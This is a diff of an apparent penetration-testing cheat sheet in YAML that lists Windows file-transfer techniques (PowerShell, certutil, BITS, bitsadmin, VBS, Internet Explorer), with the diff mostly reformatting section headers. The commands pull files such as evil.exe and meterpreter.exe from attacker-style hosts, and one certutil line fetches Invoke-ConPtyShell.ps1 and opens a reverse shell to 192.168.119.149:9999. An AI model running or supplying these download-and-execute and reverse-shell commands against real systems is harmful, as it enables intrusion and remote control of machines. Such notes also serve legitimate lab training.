@@ -4,7 +4,9 @@ functions:
     - description: Techniques allow you to download remote files onto windows systems
       code: |
         
-        +++++++++POWERSHELL+++++++++
+        POWERSHELL
+
+
         powershell -c iwr -Uri http://192.168.119.149:8000/task.xml -OutFile task.xml -usebasicparsing
 
         powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')"
@@ -17,20 +19,24 @@ functions:
 		
 		(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.149/file.exe', 'here.exe')
 
-        +++++++++certutil+++++++++
+        CERTUTIL
+
+
         certutil.exe -urlcache -f http://192.168.119.149:8000/task.xml task.xml
         certutil.exe -urlcache -f http://192.168.119.149:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1; Invoke-ConPtyShell 192.168.119.149 9999
 
 
-        +++++++++PS BITSADMIN+++++++++
+        PS BITSADMIN
+
+
         Import-Module BitsTransfer
         Start-BitsTransfer -Source $url -Destination $output
         #OR
         Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 
 
-        +++++++++CMD BITSADMIN+++++++++
-        #does not work with pth
+        BITSADMIN
+        
 
         Download:
         bitsadmin /create /download myjob
@@ -40,14 +46,18 @@ functions:
         bitsadmin /complete myjob
 
 
-        +++++++++VBS+++++++++
+        VBS
+
+
         see wget.vbs
 
         Specific File [replace filenames]:
         echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"
 
 
-        +++++++++IE+++++++++
+        IE
+
+        
         iexplorer.exe http://192.168.119.149:8000/1.bat
         iexplorer.exe http://192.168.119.149/task.xml
 
